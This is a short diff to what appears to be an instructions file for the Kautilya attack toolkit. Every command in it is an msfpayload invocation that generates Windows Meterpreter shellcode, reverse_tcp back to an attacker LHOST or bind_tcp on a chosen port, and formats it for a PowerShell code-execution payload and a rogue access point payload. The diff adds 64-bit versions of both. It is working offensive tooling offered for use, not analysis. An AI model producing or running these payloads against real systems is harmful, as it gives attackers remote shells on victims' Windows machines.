@@ -5,8 +5,14 @@
 
 ./msfpayload windows/meterpreter/reverse_tcp LHOST=<IP> EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'> powershell_codeexec.txt
 
+#For 64-bit machines.
+./msfpayload windows/x64/meterpreter/reverse_tcp LHOST=<IP> EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'> powershell_codeexec.txt
+
 
 #For Rogue AP payload, use below command. The generated shellcode file should be copied to the src directory of Kautilya.
 #Here LPORT would be the port provided as an option to Kautilya while generating Rogue AP payload.
 
 ./msfpayload windows/meterpreter/bind_tcp LPORT=<Port> EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'> rogue_ap.txt
+
+#For 64-bit machines.
+./msfpayload windows/x64/meterpreter/bind_tcp LPORT=<Port> EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'> rogue_ap.txt
